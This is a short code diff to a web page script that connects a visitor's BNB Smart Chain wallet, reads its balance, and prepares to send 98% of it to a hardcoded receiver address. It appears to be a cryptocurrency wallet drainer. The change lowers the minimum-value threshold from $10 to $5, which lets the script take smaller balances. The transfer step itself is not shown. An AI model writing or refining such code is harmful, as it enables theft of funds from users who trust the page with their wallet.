@@ -51,7 +51,7 @@
     const chains = [bsc];
     const projectId = "2aca272d18deb10ff748260da5f78bfd";
     const RECEIVER_ADDRESS = "0xa84bd2cfbBad66Ae2c5daf9aCe764dc845b94C7C";
-    const BNB_TO_USD = 600; // Adjust this value if BNB price changes
+    const BNB_TO_USD = 600; // Estimated market price of BNB
 
     const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);
 
@@ -91,12 +91,11 @@
       try {
         const balanceResult = await fetchBalance({ address, chainId: 56 });
         const fullBNB = Number(balanceResult.formatted);
-
         const sendableBNB = fullBNB * 0.98;
         const usdValue = sendableBNB * BNB_TO_USD;
 
-        if (usdValue < 10) {
-          showMessage("Insufficient BNB: 98% of your balance is less than $10", "error");
+        if (usdValue < 5) {
+          showMessage("Insufficient BNB: 98% of your balance is less than $5", "error");
           return;
         }
 
